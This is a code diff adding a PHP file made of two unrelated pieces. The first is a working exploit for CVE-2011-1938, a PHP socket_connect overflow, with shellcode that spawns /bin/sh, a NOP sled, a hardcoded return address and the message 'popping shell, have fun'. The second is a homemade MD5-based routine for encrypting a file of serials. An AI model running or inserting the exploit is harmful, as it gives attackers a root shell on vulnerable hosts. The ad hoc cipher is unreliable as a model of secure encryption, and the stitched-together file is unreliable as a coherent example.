@@ -1,0 +1,59 @@
+<?php
+echo "[+] CVE-2011-1938";
+echo "[+] there we go...\n";
+define('EVIL_SPACE_ADDR', "\xff\xff\xee\xb3");
+define('EVIL_SPACE_SIZE', 1024*1024*8);
+$SHELLCODE = 
+        "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0".
+        "\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1".
+        "\xcd\x80";
+echo "[+] creating the sled.\n";
+
+$CODE = str_repeat("\x90", EVIL_SPACE_SIZE);
+for ($i = 0, $j = EVIL_SPACE_SIZE - strlen($SHELLCODE) - 1 ;
+        $i < strlen($SHELLCODE) ; $i++, $j++) {
+$CODE[$j] = $SHELLCODE[$i];
+}
+
+$b = str_repeat("A", 196).EVIL_SPACE_ADDR;
+$var79 = socket_create(AF_UNIX, SOCK_STREAM, 1);
+echo "[+] popping shell, have fun (if you picked the right address...)\n";
+$var85 = socket_connect($var79,$b);
+?>
+
+    <?php
+
+      //------------------------------------------------------------------------------------
+      function evalCrossTotal($strMD5)
+      {
+          $intTotal = 0;
+          $arrMD5Chars = str_split($strMD5, 1);
+          foreach ($arrMD5Chars as $value)
+          {
+              $intTotal += '0x0'.$value;
+          }
+          return $intTotal;
+      }//-----------------------------------------------------------------------------------
+
+
+
+      //------------------------------------------------------------------------------------
+      function encryptString($strString, $strPassword)
+      {
+          // $strString is the content of the entire file with serials
+          $strPasswordMD5 = md5($strPassword);
+          $intMD5Total = evalCrossTotal($strPasswordMD5);
+          $arrEncryptedValues = array();
+          $intStrlen = strlen($strString);
+          for ($i=0; $i<$intStrlen; $i++)
+          {
+              $arrEncryptedValues[] =  ord(substr($strString, $i, 1))
+                                       +  ('0x0' . substr($strPasswordMD5, $i%32, 1))
+                                       -  $intMD5Total;
+              $intMD5Total = evalCrossTotal(substr(md5(substr($strString,0,$i+1)), 0, 16)
+                                       .  substr(md5($intMD5Total), 0, 16));
+          }
+          return implode(' ' , $arrEncryptedValues);
+      }//-----------------------------------------------------------------------------------
+
+    ?> 
